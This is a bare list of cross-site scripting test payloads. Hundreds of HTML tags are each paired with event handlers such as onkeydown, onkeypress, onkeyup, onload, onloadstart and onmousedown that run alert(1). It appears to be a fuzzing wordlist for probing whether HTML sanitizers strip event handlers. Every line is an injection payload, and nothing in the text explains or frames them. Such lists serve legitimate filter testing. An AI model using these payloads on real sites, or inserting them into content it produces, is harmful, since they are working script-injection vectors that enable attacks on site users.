<output onkeydown="alert(1)" contenteditable>test</output>
<p onkeydown="alert(1)" contenteditable>test</p>
<param onkeydown="alert(1)" contenteditable>test</param>
<picture onkeydown="alert(1)" contenteditable>test</picture>
<plaintext onkeydown="alert(1)" contenteditable>test</plaintext>
<pre onkeydown="alert(1)" contenteditable>test</pre>
<progress onkeydown="alert(1)" contenteditable>test</progress>
<q onkeydown="alert(1)" contenteditable>test</q>
<rb onkeydown="alert(1)" contenteditable>test</rb>
<rp onkeydown="alert(1)" contenteditable>test</rp>
<rt onkeydown="alert(1)" contenteditable>test</rt>
<rtc onkeydown="alert(1)" contenteditable>test</rtc>
<ruby onkeydown="alert(1)" contenteditable>test</ruby>
<s onkeydown="alert(1)" contenteditable>test</s>
<samp onkeydown="alert(1)" contenteditable>test</samp>
<script onkeydown="alert(1)" contenteditable>test</script>
<section onkeydown="alert(1)" contenteditable>test</section>
<select onkeydown="alert(1)" contenteditable>test</select>
<shadow onkeydown="alert(1)" contenteditable>test</shadow>
<slot onkeydown="alert(1)" contenteditable>test</slot>
<small onkeydown="alert(1)" contenteditable>test</small>
<source onkeydown="alert(1)" contenteditable>test</source>
<spacer onkeydown="alert(1)" contenteditable>test</spacer>
<span onkeydown="alert(1)" contenteditable>test</span>
<strike onkeydown="alert(1)" contenteditable>test</strike>
<strong onkeydown="alert(1)" contenteditable>test</strong>
<style onkeydown="alert(1)" contenteditable>test</style>
<sub onkeydown="alert(1)" contenteditable>test</sub>
<summary onkeydown="alert(1)" contenteditable>test</summary>
<sup onkeydown="alert(1)" contenteditable>test</sup>
<svg onkeydown="alert(1)" contenteditable>test</svg>
<table onkeydown="alert(1)" contenteditable>test</table>
<tbody onkeydown="alert(1)" contenteditable>test</tbody>
<td onkeydown="alert(1)" contenteditable>test</td>
<template onkeydown="alert(1)" contenteditable>test</template>
<textarea onkeydown="alert(1)" contenteditable>test</textarea>
<tfoot onkeydown="alert(1)" contenteditable>test</tfoot>
<th onkeydown="alert(1)" contenteditable>test</th>
<thead onkeydown="alert(1)" contenteditable>test</thead>
<time onkeydown="alert(1)" contenteditable>test</time>
<title onkeydown="alert(1)" contenteditable>test</title>
<tr onkeydown="alert(1)" contenteditable>test</tr>
<track onkeydown="alert(1)" contenteditable>test</track>
<tt onkeydown="alert(1)" contenteditable>test</tt>
<u onkeydown="alert(1)" contenteditable>test</u>
<ul onkeydown="alert(1)" contenteditable>test</ul>
<var onkeydown="alert(1)" contenteditable>test</var>
<video onkeydown="alert(1)" contenteditable>test</video>
<wbr onkeydown="alert(1)" contenteditable>test</wbr>
<xmp onkeydown="alert(1)" contenteditable>test</xmp>
<a onkeypress="alert(1)" contenteditable>test</a>
<abbr onkeypress="alert(1)" contenteditable>test</abbr>
<acronym onkeypress="alert(1)" contenteditable>test</acronym>
<address onkeypress="alert(1)" contenteditable>test</address>
<applet onkeypress="alert(1)" contenteditable>test</applet>
<area onkeypress="alert(1)" contenteditable>test</area>
<article onkeypress="alert(1)" contenteditable>test</article>
<aside onkeypress="alert(1)" contenteditable>test</aside>
<audio onkeypress="alert(1)" contenteditable>test</audio>
<b onkeypress="alert(1)" contenteditable>test</b>
<base onkeypress="alert(1)" contenteditable>test</base>
<basefont onkeypress="alert(1)" contenteditable>test</basefont>
<bdi onkeypress="alert(1)" contenteditable>test</bdi>
<bdo onkeypress="alert(1)" contenteditable>test</bdo>
<bgsound onkeypress="alert(1)" contenteditable>test</bgsound>
<big onkeypress="alert(1)" contenteditable>test</big>
<blink onkeypress="alert(1)" contenteditable>test</blink>
<blockquote onkeypress="alert(1)" contenteditable>test</blockquote>
<body onkeypress="alert(1)" contenteditable>test</body>
<br onkeypress="alert(1)" contenteditable>test</br>
<button onkeypress="alert(1)" contenteditable>test</button>
<canvas onkeypress="alert(1)" contenteditable>test</canvas>
<caption onkeypress="alert(1)" contenteditable>test</caption>
<center onkeypress="alert(1)" contenteditable>test</center>
<cite onkeypress="alert(1)" contenteditable>test</cite>
<code onkeypress="alert(1)" contenteditable>test</code>
<col onkeypress="alert(1)" contenteditable>test</col>
<colgroup onkeypress="alert(1)" contenteditable>test</colgroup>
<command onkeypress="alert(1)" contenteditable>test</command>
<content onkeypress="alert(1)" contenteditable>test</content>
<data onkeypress="alert(1)" contenteditable>test</data>
<datalist onkeypress="alert(1)" contenteditable>test</datalist>
<dd onkeypress="alert(1)" contenteditable>test</dd>
<del onkeypress="alert(1)" contenteditable>test</del>
<details onkeypress="alert(1)" contenteditable>test</details>
<dfn onkeypress="alert(1)" contenteditable>test</dfn>
<dialog onkeypress="alert(1)" contenteditable>test</dialog>
<dir onkeypress="alert(1)" contenteditable>test</dir>
<div onkeypress="alert(1)" contenteditable>test</div>
<dl onkeypress="alert(1)" contenteditable>test</dl>
<dt onkeypress="alert(1)" contenteditable>test</dt>
<element onkeypress="alert(1)" contenteditable>test</element>
<em onkeypress="alert(1)" contenteditable>test</em>
<embed onkeypress="alert(1)" contenteditable>test</embed>
<fieldset onkeypress="alert(1)" contenteditable>test</fieldset>
<figcaption onkeypress="alert(1)" contenteditable>test</figcaption>
<figure onkeypress="alert(1)" contenteditable>test</figure>
<font onkeypress="alert(1)" contenteditable>test</font>
<footer onkeypress="alert(1)" contenteditable>test</footer>
<form onkeypress="alert(1)" contenteditable>test</form>
<frame onkeypress="alert(1)" contenteditable>test</frame>
<frameset onkeypress="alert(1)" contenteditable>test</frameset>
<h1 onkeypress="alert(1)" contenteditable>test</h1>
<head onkeypress="alert(1)" contenteditable>test</head>
<header onkeypress="alert(1)" contenteditable>test</header>
<hgroup onkeypress="alert(1)" contenteditable>test</hgroup>
<hr onkeypress="alert(1)" contenteditable>test</hr>
<html onkeypress="alert(1)" contenteditable>test</html>
<i onkeypress="alert(1)" contenteditable>test</i>
<iframe onkeypress="alert(1)" contenteditable>test</iframe>
<image onkeypress="alert(1)" contenteditable>test</image>
<img onkeypress="alert(1)" contenteditable>test</img>
<input onkeypress="alert(1)" contenteditable>test</input>
<ins onkeypress="alert(1)" contenteditable>test</ins>
<isindex onkeypress="alert(1)" contenteditable>test</isindex>
<kbd onkeypress="alert(1)" contenteditable>test</kbd>
<keygen onkeypress="alert(1)" contenteditable>test</keygen>
<label onkeypress="alert(1)" contenteditable>test</label>
<legend onkeypress="alert(1)" contenteditable>test</legend>
<li onkeypress="alert(1)" contenteditable>test</li>
<link onkeypress="alert(1)" contenteditable>test</link>
<listing onkeypress="alert(1)" contenteditable>test</listing>
<main onkeypress="alert(1)" contenteditable>test</main>
<map onkeypress="alert(1)" contenteditable>test</map>
<mark onkeypress="alert(1)" contenteditable>test</mark>
<marquee onkeypress="alert(1)" contenteditable>test</marquee>
<menu onkeypress="alert(1)" contenteditable>test</menu>
<menuitem onkeypress="alert(1)" contenteditable>test</menuitem>
<meta onkeypress="alert(1)" contenteditable>test</meta>
<meter onkeypress="alert(1)" contenteditable>test</meter>
<multicol onkeypress="alert(1)" contenteditable>test</multicol>
<nav onkeypress="alert(1)" contenteditable>test</nav>
<nextid onkeypress="alert(1)" contenteditable>test</nextid>
<nobr onkeypress="alert(1)" contenteditable>test</nobr>
<noembed onkeypress="alert(1)" contenteditable>test</noembed>
<noframes onkeypress="alert(1)" contenteditable>test</noframes>
<noscript onkeypress="alert(1)" contenteditable>test</noscript>
<object onkeypress="alert(1)" contenteditable>test</object>
<ol onkeypress="alert(1)" contenteditable>test</ol>
<optgroup onkeypress="alert(1)" contenteditable>test</optgroup>
<option onkeypress="alert(1)" contenteditable>test</option>
<output onkeypress="alert(1)" contenteditable>test</output>
<p onkeypress="alert(1)" contenteditable>test</p>
<param onkeypress="alert(1)" contenteditable>test</param>
<picture onkeypress="alert(1)" contenteditable>test</picture>
<plaintext onkeypress="alert(1)" contenteditable>test</plaintext>
<pre onkeypress="alert(1)" contenteditable>test</pre>
<progress onkeypress="alert(1)" contenteditable>test</progress>
<q onkeypress="alert(1)" contenteditable>test</q>
<rb onkeypress="alert(1)" contenteditable>test</rb>
<rp onkeypress="alert(1)" contenteditable>test</rp>
<rt onkeypress="alert(1)" contenteditable>test</rt>
<rtc onkeypress="alert(1)" contenteditable>test</rtc>
<ruby onkeypress="alert(1)" contenteditable>test</ruby>
<s onkeypress="alert(1)" contenteditable>test</s>
<samp onkeypress="alert(1)" contenteditable>test</samp>
<script onkeypress="alert(1)" contenteditable>test</script>
<section onkeypress="alert(1)" contenteditable>test</section>
<select onkeypress="alert(1)" contenteditable>test</select>
<shadow onkeypress="alert(1)" contenteditable>test</shadow>
<slot onkeypress="alert(1)" contenteditable>test</slot>
<small onkeypress="alert(1)" contenteditable>test</small>
<source onkeypress="alert(1)" contenteditable>test</source>
<spacer onkeypress="alert(1)" contenteditable>test</spacer>
<span onkeypress="alert(1)" contenteditable>test</span>
<strike onkeypress="alert(1)" contenteditable>test</strike>
<strong onkeypress="alert(1)" contenteditable>test</strong>
<style onkeypress="alert(1)" contenteditable>test</style>
<sub onkeypress="alert(1)" contenteditable>test</sub>
<summary onkeypress="alert(1)" contenteditable>test</summary>
<sup onkeypress="alert(1)" contenteditable>test</sup>
<svg onkeypress="alert(1)" contenteditable>test</svg>
<table onkeypress="alert(1)" contenteditable>test</table>
<tbody onkeypress="alert(1)" contenteditable>test</tbody>
<td onkeypress="alert(1)" contenteditable>test</td>
<template onkeypress="alert(1)" contenteditable>test</template>
<textarea onkeypress="alert(1)" contenteditable>test</textarea>
<tfoot onkeypress="alert(1)" contenteditable>test</tfoot>
<th onkeypress="alert(1)" contenteditable>test</th>
<thead onkeypress="alert(1)" contenteditable>test</thead>
<time onkeypress="alert(1)" contenteditable>test</time>
<title onkeypress="alert(1)" contenteditable>test</title>
<tr onkeypress="alert(1)" contenteditable>test</tr>
<track onkeypress="alert(1)" contenteditable>test</track>
<tt onkeypress="alert(1)" contenteditable>test</tt>
<u onkeypress="alert(1)" contenteditable>test</u>
<ul onkeypress="alert(1)" contenteditable>test</ul>
<var onkeypress="alert(1)" contenteditable>test</var>
<video onkeypress="alert(1)" contenteditable>test</video>
<wbr onkeypress="alert(1)" contenteditable>test</wbr>
<xmp onkeypress="alert(1)" contenteditable>test</xmp>
<a onkeyup="alert(1)" contenteditable>test</a>
<abbr onkeyup="alert(1)" contenteditable>test</abbr>
<acronym onkeyup="alert(1)" contenteditable>test</acronym>
<address onkeyup="alert(1)" contenteditable>test</address>
<applet onkeyup="alert(1)" contenteditable>test</applet>
<area onkeyup="alert(1)" contenteditable>test</area>
<article onkeyup="alert(1)" contenteditable>test</article>
<aside onkeyup="alert(1)" contenteditable>test</aside>
<audio onkeyup="alert(1)" contenteditable>test</audio>
<b onkeyup="alert(1)" contenteditable>test</b>
<base onkeyup="alert(1)" contenteditable>test</base>
<basefont onkeyup="alert(1)" contenteditable>test</basefont>
<bdi onkeyup="alert(1)" contenteditable>test</bdi>
<bdo onkeyup="alert(1)" contenteditable>test</bdo>
<bgsound onkeyup="alert(1)" contenteditable>test</bgsound>
<big onkeyup="alert(1)" contenteditable>test</big>
<blink onkeyup="alert(1)" contenteditable>test</blink>
<blockquote onkeyup="alert(1)" contenteditable>test</blockquote>
<body onkeyup="alert(1)" contenteditable>test</body>
<br onkeyup="alert(1)" contenteditable>test</br>
<button onkeyup="alert(1)" contenteditable>test</button>
<canvas onkeyup="alert(1)" contenteditable>test</canvas>
<caption onkeyup="alert(1)" contenteditable>test</caption>
<center onkeyup="alert(1)" contenteditable>test</center>
<cite onkeyup="alert(1)" contenteditable>test</cite>
<code onkeyup="alert(1)" contenteditable>test</code>
<col onkeyup="alert(1)" contenteditable>test</col>
<colgroup onkeyup="alert(1)" contenteditable>test</colgroup>
<command onkeyup="alert(1)" contenteditable>test</command>
<content onkeyup="alert(1)" contenteditable>test</content>
<data onkeyup="alert(1)" contenteditable>test</data>
<datalist onkeyup="alert(1)" contenteditable>test</datalist>
<dd onkeyup="alert(1)" contenteditable>test</dd>
<del onkeyup="alert(1)" contenteditable>test</del>
<details onkeyup="alert(1)" contenteditable>test</details>
<dfn onkeyup="alert(1)" contenteditable>test</dfn>
<dialog onkeyup="alert(1)" contenteditable>test</dialog>
<dir onkeyup="alert(1)" contenteditable>test</dir>
<div onkeyup="alert(1)" contenteditable>test</div>
<dl onkeyup="alert(1)" contenteditable>test</dl>
<dt onkeyup="alert(1)" contenteditable>test</dt>
<element onkeyup="alert(1)" contenteditable>test</element>
<em onkeyup="alert(1)" contenteditable>test</em>
<embed onkeyup="alert(1)" contenteditable>test</embed>
<fieldset onkeyup="alert(1)" contenteditable>test</fieldset>
<figcaption onkeyup="alert(1)" contenteditable>test</figcaption>
<figure onkeyup="alert(1)" contenteditable>test</figure>
<font onkeyup="alert(1)" contenteditable>test</font>
<footer onkeyup="alert(1)" contenteditable>test</footer>
<form onkeyup="alert(1)" contenteditable>test</form>
<frame onkeyup="alert(1)" contenteditable>test</frame>
<frameset onkeyup="alert(1)" contenteditable>test</frameset>
<h1 onkeyup="alert(1)" contenteditable>test</h1>
<head onkeyup="alert(1)" contenteditable>test</head>
<header onkeyup="alert(1)" contenteditable>test</header>
<hgroup onkeyup="alert(1)" contenteditable>test</hgroup>
<hr onkeyup="alert(1)" contenteditable>test</hr>
<html onkeyup="alert(1)" contenteditable>test</html>
<i onkeyup="alert(1)" contenteditable>test</i>
<iframe onkeyup="alert(1)" contenteditable>test</iframe>
<image onkeyup="alert(1)" contenteditable>test</image>
<img onkeyup="alert(1)" contenteditable>test</img>
<input onkeyup="alert(1)" contenteditable>test</input>
<ins onkeyup="alert(1)" contenteditable>test</ins>
<isindex onkeyup="alert(1)" contenteditable>test</isindex>
<kbd onkeyup="alert(1)" contenteditable>test</kbd>
<keygen onkeyup="alert(1)" contenteditable>test</keygen>
<label onkeyup="alert(1)" contenteditable>test</label>
<legend onkeyup="alert(1)" contenteditable>test</legend>
<li onkeyup="alert(1)" contenteditable>test</li>
<link onkeyup="alert(1)" contenteditable>test</link>
<listing onkeyup="alert(1)" contenteditable>test</listing>
<main onkeyup="alert(1)" contenteditable>test</main>
<map onkeyup="alert(1)" contenteditable>test</map>
<mark onkeyup="alert(1)" contenteditable>test</mark>
<marquee onkeyup="alert(1)" contenteditable>test</marquee>
<menu onkeyup="alert(1)" contenteditable>test</menu>
<menuitem onkeyup="alert(1)" contenteditable>test</menuitem>
<meta onkeyup="alert(1)" contenteditable>test</meta>
<meter onkeyup="alert(1)" contenteditable>test</meter>
<multicol onkeyup="alert(1)" contenteditable>test</multicol>
<nav onkeyup="alert(1)" contenteditable>test</nav>
<nextid onkeyup="alert(1)" contenteditable>test</nextid>
<nobr onkeyup="alert(1)" contenteditable>test</nobr>
<noembed onkeyup="alert(1)" contenteditable>test</noembed>
<noframes onkeyup="alert(1)" contenteditable>test</noframes>
<noscript onkeyup="alert(1)" contenteditable>test</noscript>
<object onkeyup="alert(1)" contenteditable>test</object>
<ol onkeyup="alert(1)" contenteditable>test</ol>
<optgroup onkeyup="alert(1)" contenteditable>test</optgroup>
<option onkeyup="alert(1)" contenteditable>test</option>
<output onkeyup="alert(1)" contenteditable>test</output>
<p onkeyup="alert(1)" contenteditable>test</p>
<param onkeyup="alert(1)" contenteditable>test</param>
<picture onkeyup="alert(1)" contenteditable>test</picture>
<plaintext onkeyup="alert(1)" contenteditable>test</plaintext>
<pre onkeyup="alert(1)" contenteditable>test</pre>
<progress onkeyup="alert(1)" contenteditable>test</progress>
<q onkeyup="alert(1)" contenteditable>test</q>
<rb onkeyup="alert(1)" contenteditable>test</rb>
<rp onkeyup="alert(1)" contenteditable>test</rp>
<rt onkeyup="alert(1)" contenteditable>test</rt>
<rtc onkeyup="alert(1)" contenteditable>test</rtc>
<ruby onkeyup="alert(1)" contenteditable>test</ruby>
<s onkeyup="alert(1)" contenteditable>test</s>
<samp onkeyup="alert(1)" contenteditable>test</samp>
<script onkeyup="alert(1)" contenteditable>test</script>
<section onkeyup="alert(1)" contenteditable>test</section>
<select onkeyup="alert(1)" contenteditable>test</select>
<shadow onkeyup="alert(1)" contenteditable>test</shadow>
<slot onkeyup="alert(1)" contenteditable>test</slot>
<small onkeyup="alert(1)" contenteditable>test</small>
<source onkeyup="alert(1)" contenteditable>test</source>
<spacer onkeyup="alert(1)" contenteditable>test</spacer>
<span onkeyup="alert(1)" contenteditable>test</span>
<strike onkeyup="alert(1)" contenteditable>test</strike>
<strong onkeyup="alert(1)" contenteditable>test</strong>
<style onkeyup="alert(1)" contenteditable>test</style>
<sub onkeyup="alert(1)" contenteditable>test</sub>
<summary onkeyup="alert(1)" contenteditable>test</summary>
<sup onkeyup="alert(1)" contenteditable>test</sup>
<svg onkeyup="alert(1)" contenteditable>test</svg>
<table onkeyup="alert(1)" contenteditable>test</table>
<tbody onkeyup="alert(1)" contenteditable>test</tbody>
<td onkeyup="alert(1)" contenteditable>test</td>
<template onkeyup="alert(1)" contenteditable>test</template>
<textarea onkeyup="alert(1)" contenteditable>test</textarea>
<tfoot onkeyup="alert(1)" contenteditable>test</tfoot>
<th onkeyup="alert(1)" contenteditable>test</th>
<thead onkeyup="alert(1)" contenteditable>test</thead>
<time onkeyup="alert(1)" contenteditable>test</time>
<title onkeyup="alert(1)" contenteditable>test</title>
<tr onkeyup="alert(1)" contenteditable>test</tr>
<track onkeyup="alert(1)" contenteditable>test</track>
<tt onkeyup="alert(1)" contenteditable>test</tt>
<u onkeyup="alert(1)" contenteditable>test</u>
<ul onkeyup="alert(1)" contenteditable>test</ul>
<var onkeyup="alert(1)" contenteditable>test</var>
<video onkeyup="alert(1)" contenteditable>test</video>
<wbr onkeyup="alert(1)" contenteditable>test</wbr>
<xmp onkeyup="alert(1)" contenteditable>test</xmp>
<body onload=alert(1)>
<script onload=alert(1) src=validjs.js></script>
<object data=/ onload=alert(1)>
<style onload=alert(1)></style>
<svg onload=alert(1)>
<link href=validstyles.css rel=stylesheet onload=alert(1)>
<iframe onload=alert(1)></iframe>
<frameset><frame onload=alert(1)>
<embed src=/ onload=alert(1)>
<img src=validimage.png onload=alert(1)>
<picture><source srcset="validimage.png"><img onload=alert(1)></picture>
<img srcset=validimage.png onload=alert(1)>
<image src=validimage.png onload=alert(1)>
<picture><source srcset="validimage.png"><image onload=alert(1)></picture>
<svg><image href=validimage.png onload=alert(1)>
<input type=image src=validimage.png onload=alert(1)>
<video><track default onload=alert(1) src="data:text/vt
<isindex type=image onload=alert(1) src=validimage.png>
<svg><a onload=alert(1)></a>
<svg><abbr onload=alert(1)></abbr>
<svg><acronym onload=alert(1)></acronym>
<svg><address onload=alert(1)></address>
<svg><applet onload=alert(1)></applet>
<svg><area onload=alert(1)></area>
<svg><article onload=alert(1)></article>
<svg><aside onload=alert(1)></aside>
<svg><audio onload=alert(1)></audio>
<svg><b onload=alert(1)></b>
<svg><base onload=alert(1)></base>
<svg><basefont onload=alert(1)></basefont>
<svg><bdi onload=alert(1)></bdi>
<svg><bdo onload=alert(1)></bdo>
<svg><bgsound onload=alert(1)></bgsound>
<svg><big onload=alert(1)></big>
<svg><blink onload=alert(1)></blink>
<svg><blockquote onload=alert(1)></blockquote>
<svg><br onload=alert(1)></br>
<svg><button onload=alert(1)></button>
<svg><canvas onload=alert(1)></canvas>
<svg><caption onload=alert(1)></caption>
<svg><center onload=alert(1)></center>
<svg><cite onload=alert(1)></cite>
<svg><code onload=alert(1)></code>
<svg><col onload=alert(1)></col>
<svg><colgroup onload=alert(1)></colgroup>
<svg><command onload=alert(1)></command>
<svg><content onload=alert(1)></content>
<svg><data onload=alert(1)></data>
<svg><datalist onload=alert(1)></datalist>
<svg><dd onload=alert(1)></dd>
<svg><del onload=alert(1)></del>
<svg><details onload=alert(1)></details>
<svg><dfn onload=alert(1)></dfn>
<svg><dialog onload=alert(1)></dialog>
<svg><dir onload=alert(1)></dir>
<svg><div onload=alert(1)></div>
<svg><dl onload=alert(1)></dl>
<svg><dt onload=alert(1)></dt>
<svg><element onload=alert(1)></element>
<svg><em onload=alert(1)></em>
<svg><fieldset onload=alert(1)></fieldset>
<svg><figcaption onload=alert(1)></figcaption>
<svg><figure onload=alert(1)></figure>
<svg><font onload=alert(1)></font>
<svg><footer onload=alert(1)></footer>
<svg><form onload=alert(1)></form>
<svg><frameset onload=alert(1)></frameset>
<svg><h1 onload=alert(1)></h1>
<svg><head onload=alert(1)></head>
<svg><header onload=alert(1)></header>
<svg><hgroup onload=alert(1)></hgroup>
<svg><hr onload=alert(1)></hr>
<svg><html onload=alert(1)></html>
<svg><i onload=alert(1)></i>
<svg><ins onload=alert(1)></ins>
<svg><kbd onload=alert(1)></kbd>
<svg><keygen onload=alert(1)></keygen>
<svg><label onload=alert(1)></label>
<svg><legend onload=alert(1)></legend>
<svg><li onload=alert(1)></li>
<svg><listing onload=alert(1)></listing>
<svg><main onload=alert(1)></main>
<svg><map onload=alert(1)></map>
<svg><mark onload=alert(1)></mark>
<svg><marquee onload=alert(1)></marquee>
<svg><menu onload=alert(1)></menu>
<svg><menuitem onload=alert(1)></menuitem>
<svg><meta onload=alert(1)></meta>
<svg><meter onload=alert(1)></meter>
<svg><multicol onload=alert(1)></multicol>
<svg><nav onload=alert(1)></nav>
<svg><nextid onload=alert(1)></nextid>
<svg><nobr onload=alert(1)></nobr>
<svg><noembed onload=alert(1)></noembed>
<svg><noframes onload=alert(1)></noframes>
<svg><noscript onload=alert(1)></noscript>
<svg><ol onload=alert(1)></ol>
<svg><optgroup onload=alert(1)></optgroup>
<svg><option onload=alert(1)></option>
<svg><output onload=alert(1)></output>
<svg><p onload=alert(1)></p>
<svg><param onload=alert(1)></param>
<svg><picture onload=alert(1)></picture>
<svg><plaintext onload=alert(1)></plaintext>
<svg><pre onload=alert(1)></pre>
<svg><progress onload=alert(1)></progress>
<svg><q onload=alert(1)></q>
<svg><rb onload=alert(1)></rb>
<svg><rp onload=alert(1)></rp>
<svg><rt onload=alert(1)></rt>
<svg><rtc onload=alert(1)></rtc>
<svg><ruby onload=alert(1)></ruby>
<svg><s onload=alert(1)></s>
<svg><samp onload=alert(1)></samp>
<svg><section onload=alert(1)></section>
<svg><select onload=alert(1)></select>
<svg><shadow onload=alert(1)></shadow>
<svg><slot onload=alert(1)></slot>
<svg><small onload=alert(1)></small>
<svg><source onload=alert(1)></source>
<svg><spacer onload=alert(1)></spacer>
<svg><span onload=alert(1)></span>
<svg><strike onload=alert(1)></strike>
<svg><strong onload=alert(1)></strong>
<svg><sub onload=alert(1)></sub>
<svg><summary onload=alert(1)></summary>
<svg><sup onload=alert(1)></sup>
<svg><table onload=alert(1)></table>
<svg><tbody onload=alert(1)></tbody>
<svg><td onload=alert(1)></td>
<svg><template onload=alert(1)></template>
<svg><textarea onload=alert(1)></textarea>
<svg><tfoot onload=alert(1)></tfoot>
<svg><th onload=alert(1)></th>
<svg><thead onload=alert(1)></thead>
<svg><time onload=alert(1)></time>
<svg><title onload=alert(1)></title>
<svg><tr onload=alert(1)></tr>
<svg><tt onload=alert(1)></tt>
<svg><u onload=alert(1)></u>
<svg><ul onload=alert(1)></ul>
<svg><var onload=alert(1)></var>
<svg><video onload=alert(1)></video>
<svg><wbr onload=alert(1)></wbr>
<svg><xmp onload=alert(1)></xmp>
<svg><xss onload=alert(1)></xss>
<video onloadeddata=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<video autoplay onloadedmetadata=alert(1)> <source src="validvideo.mp4" type="video/mp4"></video>
<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
<img src=validimage.png onloadend=alert(1)>
<picture><source srcset="validimage.png"><img onloadend=alert(1)></picture>
<img src=validimage.png onloadend=alert(1)>
<picture><source srcset="validimage.png"><img onloadend=alert(1)></picture>
<input type=image onloadend=alert(1) src=validimage.png>
<img src=validimage.png onloadstart=alert(1)>
<picture><source srcset="validimage.png"><img onloadstart=alert(1)></picture>
<img src=validimage.png onloadstart=alert(1)>
<picture><source srcset="validimage.png"><img onloadstart=alert(1)></picture>
<input type=image onloadstart=alert(1) src=validimage.png>
<body onmessage=alert(1)>
<a onmousedown="alert(1)">test</a>
<abbr onmousedown="alert(1)">test</abbr>
<acronym onmousedown="alert(1)">test</acronym>
<address onmousedown="alert(1)">test</address>
<applet onmousedown="alert(1)">test</applet>
<area onmousedown="alert(1)">test</area>
<article onmousedown="alert(1)">test</article>
<aside onmousedown="alert(1)">test</aside>
<audio onmousedown="alert(1)">test</audio>
<b onmousedown="alert(1)">test</b>
<base onmousedown="alert(1)">test</base>
<basefont onmousedown="alert(1)">test</basefont>
<bdi onmousedown="alert(1)">test</bdi>
<bdo onmousedown="alert(1)">test</bdo>
<bgsound onmousedown="alert(1)">test</bgsound>
<big onmousedown="alert(1)">test</big>
<blink onmousedown="alert(1)">test</blink>
<blockquote onmousedown="alert(1)">test</blockquote>
<body onmousedown="alert(1)">test</body>
<br onmousedown="alert(1)">test</br>
<button onmousedown="alert(1)">test</button>
<canvas onmousedown="alert(1)">test</canvas>
<caption onmousedown="alert(1)">test</caption>
<center onmousedown="alert(1)">test</center>
<cite onmousedown="alert(1)">test</cite>
<code onmousedown="alert(1)">test</code>
<col onmousedown="alert(1)">test</col>
<colgroup onmousedown="alert(1)">test</colgroup>
<command onmousedown="alert(1)">test</command>
<content onmousedown="alert(1)">test</content>
<data onmousedown="alert(1)">test</data>
<datalist onmousedown="alert(1)">test</datalist>
<dd onmousedown="alert(1)">test</dd>
<del onmousedown="alert(1)">test</del>
<details onmousedown="alert(1)">test</details>
<dfn onmousedown="alert(1)">test</dfn>
<dialog onmousedown="alert(1)">test</dialog>
<dir onmousedown="alert(1)">test</dir>
<div onmousedown="alert(1)">test</div>
<dl onmousedown="alert(1)">test</dl>
<dt onmousedown="alert(1)">test</dt>
<element onmousedown="alert(1)">test</element>
<em onmousedown="alert(1)">test</em>
<embed onmousedown="alert(1)">test</embed>
<fieldset onmousedown="alert(1)">test</fieldset>
<figcaption onmousedown="alert(1)">test</figcaption>
<figure onmousedown="alert(1)">test</figure>
<font onmousedown="alert(1)">test</font>
<footer onmousedown="alert(1)">test</footer>
<form onmousedown="alert(1)">test</form>
<frame onmousedown="alert(1)">test</frame>
<frameset onmousedown="alert(1)">test</frameset>
<h1 onmousedown="alert(1)">test</h1>
<head onmousedown="alert(1)">test</head>
<header onmousedown="alert(1)">test</header>
<hgroup onmousedown="alert(1)">test</hgroup>
<hr onmousedown="alert(1)">test</hr>
<html onmousedown="alert(1)">test</html>
<i onmousedown="alert(1)">test</i>
<iframe onmousedown="alert(1)">test</iframe>
<image onmousedown="alert(1)">test</image>
<img onmousedown="alert(1)">test</img>
<input onmousedown="alert(1)">test</input>
<ins onmousedown="alert(1)">test</ins>
<isindex onmousedown="alert(1)">test</isindex>
<kbd onmousedown="alert(1)">test</kbd>
<keygen onmousedown="alert(1)">test</keygen>
<label onmousedown="alert(1)">test</label>
<legend onmousedown="alert(1)">test</legend>
<li onmousedown="alert(1)">test</li>
<link onmousedown="alert(1)">test</link>
<listing onmousedown="alert(1)">test</listing>
<main onmousedown="alert(1)">test</main>
<map onmousedown="alert(1)">test</map>
<mark onmousedown="alert(1)">test</mark>
<marquee onmousedown="alert(1)">test</marquee>
<menu onmousedown="alert(1)">test</menu>
<menuitem onmousedown="alert(1)">test</menuitem>
<meta onmousedown="alert(1)">test</meta>
<meter onmousedown="alert(1)">test</meter>
<multicol onmousedown="alert(1)">test</multicol>
<nav onmousedown="alert(1)">test</nav>
<nextid onmousedown="alert(1)">test</nextid>
<nobr onmousedown="alert(1)">test</nobr>
<noembed onmousedown="alert(1)">test</noembed>
<noframes onmousedown="alert(1)">test</noframes>
<noscript onmousedown="alert(1)">test</noscript>
<object onmousedown="alert(1)">test</object>
<ol onmousedown="alert(1)">test</ol>
<optgroup onmousedown="alert(1)">test</optgroup>
<option onmousedown="alert(1)">test</option>
<output onmousedown="alert(1)">test</output>
<p onmousedown="alert(1)">test</p>
<param onmousedown="alert(1)">test</param>
<picture onmousedown="alert(1)">test</picture>
<plaintext onmousedown="alert(1)">test</plaintext>
<pre onmousedown="alert(1)">test</pre>
<progress onmousedown="alert(1)">test</progress>
<q onmousedown="alert(1)">test</q>
<rb onmousedown="alert(1)">test</rb>
<rp onmousedown="alert(1)">test</rp>
<rt onmousedown="alert(1)">test</rt>
<rtc onmousedown="alert(1)">test</rtc>
<ruby onmousedown="alert(1)">test</ruby>
<s onmousedown="alert(1)">test</s>
<samp onmousedown="alert(1)">test</samp>
<script onmousedown="alert(1)">test</script>
<section onmousedown="alert(1)">test</section>
<select onmousedown="alert(1)">test</select>
<shadow onmousedown="alert(1)">test</shadow>
<slot onmousedown="alert(1)">test</slot>
<small onmousedown="alert(1)">test</small>
<source onmousedown="alert(1)">test</source>
<spacer onmousedown="alert(1)">test</spacer>
<span onmousedown="alert(1)">test</span>
<strike onmousedown="alert(1)">test</strike>
<strong onmousedown="alert(1)">test</strong>
<style onmousedown="alert(1)">test</style>
<sub onmousedown="alert(1)">test</sub>
<summary onmousedown="alert(1)">test</summary>
<sup onmousedown="alert(1)">test</sup>
<svg onmousedown="alert(1)">test</svg>
<table onmousedown="alert(1)">test</table>
<tbody onmousedown="alert(1)">test</tbody>
<td onmousedown="alert(1)">test</td>
<template onmousedown="alert(1)">test</template>
<textarea onmousedown="alert(1)">test</textarea>
<tfoot onmousedown="alert(1)">test</tfoot>
<th onmousedown="alert(1)">test</th>
<thead onmousedown="alert(1)">test</thead>
<time onmousedown="alert(1)">test</time>
<title onmousedown="alert(1)">test</title>
<tr onmousedown="alert(1)">test</tr>
<track onmousedown="alert(1)">test</track>
<tt onmousedown="alert(1)">test</tt>
<u onmousedown="alert(1)">test</u>
